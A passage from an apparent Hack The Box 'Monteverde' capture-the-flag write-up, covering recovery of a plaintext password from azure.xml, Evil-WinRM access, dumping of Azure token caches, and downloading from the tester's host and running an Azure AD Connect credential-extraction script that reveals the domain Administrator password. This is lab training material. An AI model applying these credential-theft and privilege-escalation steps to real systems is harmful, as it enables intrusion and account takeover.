  .                                   D        0  Fri Jan  3 08:41:18 2020
  ..                                  D        0  Fri Jan  3 08:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020

                524031 blocks of size 4096. 519955 blocks available
smb: \mhope\> get azure.xml 
getting file \mhope\azure.xml of size 1212 as azure.xml (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
```

...`mhope` folder contained `azure.xml`...

### Finding user credentials

```markup
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

...we have a password for \`mhope\`!...since mhope was a member of the `Remote Management Users` group...`Evil-WinRM` is a great tool to gain access...

```text
zweilos@kalimaa:~/htb/monteverde$ evil-winrm -i 10.10.10.172 -u mhope 
Enter Password: 

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ============================================
megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

### user.txt

```text
*Evil-WinRM* PS C:\Users\mhope\Documents> cat ../Desktop/user.txt
8d6d8cdd486ae85f67feb6096f133cec
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User - mhope

...`Azure Admins` group sounds interesting!...

```text
*Evil-WinRM* PS C:\Users\mhope\Documents> cd ..
*Evil-WinRM* PS C:\Users\mhope> ls


    Directory: C:\Users\mhope


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/3/2020   5:35 AM                .Azure
d-r---         1/3/2020   5:24 AM                3D Objects
d-r---         1/3/2020   5:24 AM                Contacts
d-r---        6/14/2020   2:05 AM                Desktop
d-r---        6/14/2020   2:25 AM                Documents
d-r---         1/3/2020   5:24 AM                Downloads
d-r---         1/3/2020   5:24 AM                Favorites
d-r---         1/3/2020   5:24 AM                Links
d-r---         1/3/2020   5:24 AM                Music
d-r---         1/3/2020   5:24 AM                Pictures
d-r---         1/3/2020   5:24 AM                Saved Games
d-r---         1/3/2020   5:24 AM                Searches
d-r---         1/3/2020   5:24 AM                Videos

*Evil-WinRM* PS C:\Users\mhope> cd .Azure
*Evil-WinRM* PS C:\Users\mhope\.Azure> ls

    Directory: C:\Users\mhope\.Azure


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/3/2020   5:35 AM                ErrorRecords
-a----         1/3/2020   5:31 AM             34 AzurePSDataCollectionProfile.json
-a----         1/3/2020   5:35 AM           2794 AzureRmContext.json
-a----         1/3/2020   5:31 AM            191 AzureRmContextSettings.json
-a----         1/3/2020   5:36 AM           7896 TokenCache.dat
```

```text
...TokenCache.dat..according to () it is simply a json formatted file, containing...
```

```text
*Evil-WinRM* PS C:\Users\mhope\.Azure> cat TokenCache.dat
#https://login.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/:::https://graph.windows.net/:::1950a258-227b-4e31-a9cf-717495945fc2:::0©{"RefreshToken":"AQABAAAAAACQN9QBRU3jT6bcBQLZNUj7aeQ8R2hfsMQE-DIEEp8rOWPiom2rNwROtUThYh6cCyfB9McL8XdHR94VQSY3KAN-SWuINLqSnI_Lfj-vM1nsCu_Kh51XTceMlWr9mZsNYiX5oCnIBT50bCWIlyeZxmpR7L4sfRp_2iESLU06U0QiHBP7L_HR75crAfpQdJ2oJEn9MWYoxFKIHxXRgAp8fwyKa5yVo5usuanLFGofYzvU6YUGwSFwHskyy_iHdmimggyI7pxp2-C0pSlRp6yZp-4JYyvoeTjxqtXkpMR7VnmJ5qIqJvecNcutXPu-SJDWRvvmW_V2se4V1u1ecuJDe02oAmouL7yp8HrcOBNgn9Jg_f27tHJSbONR-rFWFmeYr-Zi84EJbubYBb7DdzZaoCArbYrgglrAOmz85N9-DMbIJdT7ffteT0hu2rHI6OVDvgckNv-XVhwMF55XtjxxxhpR1EljIq07qCPCqSVoNnoyhDawgyYiNRh0EVr1kf6GEA9bAYNMHgf3VN5WApXbb0VzoxozBKNkNiMybB-uA1d9DLs1eOimxrhoKjsK6cyKTsslGe8qgjcLS0pcRDVvNub1_fKQAXqVB4WZXMo_TDSALh-ctiwVVFNRqTeGsdzcfJe7j3WwzuIiuWfIYydSQKaeRo87qtg6v4dHy4hVBOwm-NPah29sOrSNsyuUydhkNK2QXCwn_hV5-7OCwfSJHG9Dja4r8B_iS0-VvcwzRUT_-2t1eNN8vgRgTlgAdotG330U9SshDgVjg27VHIw-e-57ID7FTEjnVfc4loRNjoNJlSAA","ResourceInResponse":"https:\/\/graph.windows.net\/","Result":{"AccessToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLndpbmRvd3MubmV0LyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OC8iLCJpYXQiOjE1NzgwNTgyNzYsIm5iZiI6MTU3ODA1ODI3NiwiZXhwIjoxNTc4MDYyMTc2LCJhY3IiOiIxIiwiYWlvIjoiNDJWZ1lBZ3NZc3BPYkdtYjU4V3ZsK0d3dzhiYXA4bnhoOWlSOEpVQit4OWQ5L0g2MEFBQSIsImFtciI6WyJwd2QiXSwiYXBwaWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJhcHBpZGFjciI6IjAiLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoiNjJlOTAzOTQtNjlmNS00MjM3LTkxOTAtMDEyMTc3MTQ1ZTEwIiwic3ViIjoiVWFTMGI5ZHJsMmlmYzlvSXZjcUFlbzRoY3c1YWpyV3g3bU5DMklrMkRsayIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJsM2xBR3NBRVYwcVdQelJ1Vkh4U0FBIiwidmVyIjoiMS4wIn0.czHUwYjleGp2C1c_BMZIZkEHz-12R86qmngaiyTeTW_bM659hqetbQylvf_qCJDuxD8e28H6Oqw5Hn1Hwij7yHK-kOjUeUlXkGyzFhQbDf3CQLvFsZioUiHHiighrVjZfu6Rolv8fxoG3Q8cXS-Ms_Wm6RI-zcaK9Eyu841D51jzvYI60rC9HTummktfVURP2xf3DnskqjJF1dDlSi62gPGXGk0xZordZFiGoYAtv8qiMAiSCioN_sw_xWRJ250nvw90biQ1NkPRpSGf8jNpbYktB0Ti8-sNblaGRJBQqmHxZ-0PkSq31op2CzHN7wwYCJOEoJpOtS-x4j1DGZ19hA","AccessTokenType":"Bearer","ExpiresOn":{"DateTime":"\/Date(1578062173584)\/","OffsetMinutes":0},"ExtendedExpiresOn":{"DateTime":"\/Date(1578062173584)\/","OffsetMinutes":0},"ExtendedLifeTimeToken":false,"IdToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4Mjc2LCJuYmYiOjE1NzgwNTgyNzYsImV4cCI6MTU3ODA2MjE3NiwiYW1yIjpbInB3ZCJdLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInN1YiI6Inl2V2x2eEFSbE84V0pKN0dUUmFYb0p0MHAwelBiUkRIX0EtcC1FTEtFdDgiLCJ0aWQiOiIzNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgiLCJ1bmlxdWVfbmFtZSI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJqb2huQGE2NzYzMjM1NDc2M291dGxvb2sub25taWNyb3NvZnQuY29tIiwidmVyIjoiMS4wIn0.","TenantId":"372efea9-7bc4-4b76-8839-984b45edfb98","UserInfo":{"DisplayableId":"john@a67632354763outlook.onmicrosoft.com","FamilyName":"Clark","GivenName":"John","IdentityProvider":"https:\/\/sts.windows.net\/372efea9-7bc4-4b76-8839-984b45edfb98\/","PasswordChangeUrl":null,"PasswordExpiresOn":null,"UniqueId":"e4f56bc1-021f-4795-bca2-bedfc819e90a"}},"UserAssertionHash":null}‘https://login.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/:::https://management.core.windows.net/:::1950a258-227b-4e31-a9cf-717495945fc2:::0‡{"RefreshToken":"AQABAAAAAACQN9QBRU3jT6bcBQLZNUj7aeQ8R2hfsMQE-DIEEp8rOWPiom2rNwROtUThYh6cCyfB9McL8XdHR94VQSY3KAN-SWuINLqSnI_Lfj-vM1nsCu_Kh51XTceMlWr9mZsNYiX5oCnIBT50bCWIlyeZxmpR7L4sfRp_2iESLU06U0QiHBP7L_HR75crAfpQdJ2oJEn9MWYoxFKIHxXRgAp8fwyKa5yVo5usuanLFGofYzvU6YUGwSFwHskyy_iHdmimggyI7pxp2-C0pSlRp6yZp-4JYyvoeTjxqtXkpMR7VnmJ5qIqJvecNcutXPu-SJDWRvvmW_V2se4V1u1ecuJDe02oAmouL7yp8HrcOBNgn9Jg_f27tHJSbONR-rFWFmeYr-Zi84EJbubYBb7DdzZaoCArbYrgglrAOmz85N9-DMbIJdT7ffteT0hu2rHI6OVDvgckNv-XVhwMF55XtjxxxhpR1EljIq07qCPCqSVoNnoyhDawgyYiNRh0EVr1kf6GEA9bAYNMHgf3VN5WApXbb0VzoxozBKNkNiMybB-uA1d9DLs1eOimxrhoKjsK6cyKTsslGe8qgjcLS0pcRDVvNub1_fKQAXqVB4WZXMo_TDSALh-ctiwVVFNRqTeGsdzcfJe7j3WwzuIiuWfIYydSQKaeRo87qtg6v4dHy4hVBOwm-NPah29sOrSNsyuUydhkNK2QXCwn_hV5-7OCwfSJHG9Dja4r8B_iS0-VvcwzRUT_-2t1eNN8vgRgTlgAdotG330U9SshDgVjg27VHIw-e-57ID7FTEjnVfc4loRNjoNJlSAA","ResourceInResponse":"https:\/\/management.core.windows.net\/","Result":{"AccessToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4MjU3LCJuYmYiOjE1NzgwNTgyNTcsImV4cCI6MTU3ODA2MjE1NywiYWNyIjoiMSIsImFpbyI6IjQyVmdZSGc3ajlGN3oxK24renhKZktXQmpxcWRYMzFEVDNLc2ovL2FzT1d5VFcycTNRSUEiLCJhbXIiOlsicHdkIl0sImFwcGlkIjoiMTk1MGEyNTgtMjI3Yi00ZTMxLWE5Y2YtNzE3NDk1OTQ1ZmMyIiwiYXBwaWRhY3IiOiIwIiwiZmFtaWx5X25hbWUiOiJDbGFyayIsImdpdmVuX25hbWUiOiJKb2huIiwiZ3JvdXBzIjpbImM3OTRlNzE3LTIxZWYtNDljZS1hZjAwLTljMDEwZGM0MWE3NiJdLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoidXNlcl9pbXBlcnNvbmF0aW9uIiwic3ViIjoid1U4Y1RtUm5tTzM2Z1E5MEx4VUNiN0tGMXZ3NlVUVlVKa1VPNThJd3NVTSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiI4MjNlVzFyWmZFQ1hEV2lHaHQ1UkFBIiwidmVyIjoiMS4wIiwid2lkcyI6WyI2MmU5MDM5NC02OWY1LTQyMzctOTE5MC0wMTIxNzcxNDVlMTAiXX0.ja68GQ9Suvm8-6a732DZy7Z7Q62XnmL0hsVnMKP3L-u7KB9W8nafebCzEmwhAoAzEqVOKfApM8VjOALGJcgz60sYbN0JtK4RaHCiF0yQogGTvgFe3FMB-26wCxGo-d_hTxiPiFUGfTuqSMzprXfBEKLneXNKcLlkav2pPNAhLD_HoshDaznMPlt2W00rq6hJII032WoZQMPYMLJmnub4pi2N3ScroWO3zDQ16wpoFCOSYbuqoLKSm-FLN8yEhTJDf2umcOaLVE7jtnHba_rEPyC_sBtIedl1nSR8kr7A9B8dBvn0pC3M7gYIVpVwIana6pni6I8jaMwH_-3aJmCLhw","AccessTokenType":"Bearer","ExpiresOn":{"DateTime":"\/Date(1578062154521)\/","OffsetMinutes":0},"ExtendedExpiresOn":{"DateTime":"\/Date(1578062154521)\/","OffsetMinutes":0},"ExtendedLifeTimeToken":false,"IdToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4MjU3LCJuYmYiOjE1NzgwNTgyNTcsImV4cCI6MTU3ODA2MjE1NywiYW1yIjpbInB3ZCJdLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInN1YiI6Inl2V2x2eEFSbE84V0pKN0dUUmFYb0p0MHAwelBiUkRIX0EtcC1FTEtFdDgiLCJ0aWQiOiIzNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgiLCJ1bmlxdWVfbmFtZSI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJqb2huQGE2NzYzMjM1NDc2M291dGxvb2sub25taWNyb3NvZnQuY29tIiwidmVyIjoiMS4wIn0.","TenantId":"372efea9-7bc4-4b76-8839-984b45edfb98","UserInfo":{"DisplayableId":"john@a67632354763outlook.onmicrosoft.com","FamilyName":"Clark","GivenName":"John","IdentityProvider":"https:\/\/sts.windows.net\/372efea9-7bc4-4b76-8839-984b45edfb98\/","PasswordChangeUrl":null,"PasswordExpiresOn":null,"UniqueId":"e4f56bc1-021f-4795-bca2-bedfc819e90a"}},"UserAssertionHash":null}
```

### Exploit research - Azure Admins group

[https://www.lares.com/blog/hunting-azure-admins-for-vertical-escalation/](https://www.lares.com/blog/hunting-azure-admins-for-vertical-escalation/)

> While this is a logical default set of permissions, the issue is in the fact that the TokenCache.dat file is a clear-text JSON file containing the AccessKey for the current session. An issue for this was submitted to the Azure github repository in June 2019.

```text
*Evil-WinRM* PS C:\Users\mhope\.Azure> Get-Acl -path C:\Users\mhope\.Azure\TokenCache.dat | ft -wrap

    Directory: C:\Users\mhope\.Azure


Path           Owner          Access
----           -----          ------
TokenCache.dat MEGABANK\mhope NT AUTHORITY\SYSTEM Allow  FullControl
                              BUILTIN\Administrators Allow  FullControl
                              MEGABANK\mhope Allow  FullControl
```

"As the operator, by simply existing in this user’s process on their workstation, you would have the correct permissions to view and exfiltrate this file.""

```javascript
*Evil-WinRM* PS C:\Users\mhope\.Azure> cat AzureRmContext.json
{
  "DefaultContextKey": "372efea9-7bc4-4b76-8839-984b45edfb98 - john@a67632354763outlook.onmicrosoft.com",
  "EnvironmentTable": {},
  "Contexts": {
    "372efea9-7bc4-4b76-8839-984b45edfb98 - john@a67632354763outlook.onmicrosoft.com": {
      "Account": {
        "Id": "john@a67632354763outlook.onmicrosoft.com",
        "Credential": null,
        "Type": "User",
        "TenantMap": {},
        "ExtendedProperties": {
          "Tenants": "372efea9-7bc4-4b76-8839-984b45edfb98"
        }
      },
      "Tenant": {
        "Id": "372efea9-7bc4-4b76-8839-984b45edfb98",
        "Directory": null,
        "ExtendedProperties": {}
      },
      "Subscription": null,
      "Environment": {
        "Name": "AzureCloud",
        "OnPremise": false,
        "ServiceManagementUrl": "https://management.core.windows.net/",
        "ResourceManagerUrl": "https://management.azure.com/",
        "ManagementPortalUrl": "https://go.microsoft.com/fwlink/?LinkId=254433",
        "PublishSettingsFileUrl": "https://go.microsoft.com/fwlink/?LinkID=301775",
        "ActiveDirectoryAuthority": "https://login.microsoftonline.com/",
        "GalleryUrl": "https://gallery.azure.com/",
        "GraphUrl": "https://graph.windows.net/",
        "ActiveDirectoryServiceEndpointResourceId": "https://management.core.windows.net/",
        "StorageEndpointSuffix": "core.windows.net",
        "SqlDatabaseDnsSuffix": ".database.windows.net",
        "TrafficManagerDnsSuffix": "trafficmanager.net",
        "AzureKeyVaultDnsSuffix": "vault.azure.net",
        "AzureKeyVaultServiceEndpointResourceId": "https://vault.azure.net",
        "GraphEndpointResourceId": "https://graph.windows.net/",
        "DataLakeEndpointResourceId": "https://datalake.azure.net/",
        "BatchEndpointResourceId": "https://batch.core.windows.net/",
        "AzureDataLakeAnalyticsCatalogAndJobEndpointSuffix": "azuredatalakeanalytics.net",
        "AzureDataLakeStoreFileSystemEndpointSuffix": "azuredatalakestore.net",
        "AdTenant": "Common",
        "VersionProfiles": [],
        "ExtendedProperties": {
          "OperationalInsightsEndpoint": "https://api.loganalytics.io/v1",
          "OperationalInsightsEndpointResourceId": "https://api.loganalytics.io",
          "AzureAnalysisServicesEndpointSuffix": "asazure.windows.net",
          "AnalysisServicesEndpointResourceId": "https://region.asazure.windows.net",
          "AzureAttestationServiceEndpointSuffix": "attest.azure.net",
          "AzureAttestationServiceEndpointResourceId": "https://attest.azure.net"
        }
      },
      "VersionProfile": null,
      "TokenCache": {
        "CacheData": null
      },
      "ExtendedProperties": {}
    }
  },
  "ExtendedProperties": {}
}
```

searching for a way to exploit this led to [https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/) which led to this powershell POC [https://blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)

### Privilege Escalation

had to edit the script to get it to work. \(sorry...I didnt write down who or where I found the fix for this script originally, it was simply in my notes with no explanation.\)

The client code at the beginning had to be edited to read:

```text
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=LocalHost;Database=ADSync;Trusted_Connection=True;"
```

Invoke-WebRequest = wget

```text
*Evil-WinRM* PS C:\Users\mhope\documents> wget http://10.10.14.253:8099/AzCreds.ps1
The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. 
At line:1 char:1
+ wget http://10.10.14.253:8099/AzCreds.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
    + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
    
*Evil-WinRM* PS C:\Users\mhope\documents> wget http://10.10.14.253:8099/AzCreds.ps1 -UseBasicParsing


StatusCode        : 200
StatusDescription : OK
Content           : {87, 114, 105, 116...}
RawContent        : HTTP/1.0 200 OK
                    Content-Length: 1741
                    Content-Type: application/octet-stream
                    Date: Sun, 14 Jun 2020 11:11:06 GMT
                    Last-Modified: Sun, 14 Jun 2020 11:03:39 GMT
                    Server: SimpleHTTP/0.6 Python/2.7.18
                    ...
Headers           : {[Content-Length, 1741], [Content-Type, application/octet-stream], [Date, Sun, 14 Jun 2020 11:11:06 GMT], [Last-Modified, Sun, 14 Jun 2020 11:03:39 GMT]...}
RawContentLength  : 1741
```

Apparently this will retrieve the file, but not actually save it to disk unless you add `-Outfile <filename>`

```text
*Evil-WinRM* PS C:\Users\mhope\documents> wget http://10.10.14.253:8099/AzCreds.ps1 -UseBasicParsing -Outfile AzCreds.ps1
```

### Getting the Administrator credentials

Now that my exploit had been successfully transferred to the target, I was able to run it and extract the `Administrator` password from Azure Connect.  

```text
*Evil-WinRM* PS C:\Users\mhope\Documents> ./AzCreds.ps1

AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

### root.txt

With the `Administrator` password in hand, it was simple to login using `evil-winrm` and to collect the root flag.

```text
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
a44ed9a4442a2d216f3f75e5c802b5b3
```

Thanks to [`egre55`](https://www.hackthebox.eu/home/users/profile/1190) for creating such a unique and interesting challenge! I certainly learned a few useful new tricks, and learned that even if you don't have a password to work with, but have gotten a list of usernames, well, sometimes people are lazy and just use their username as the password!

If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).

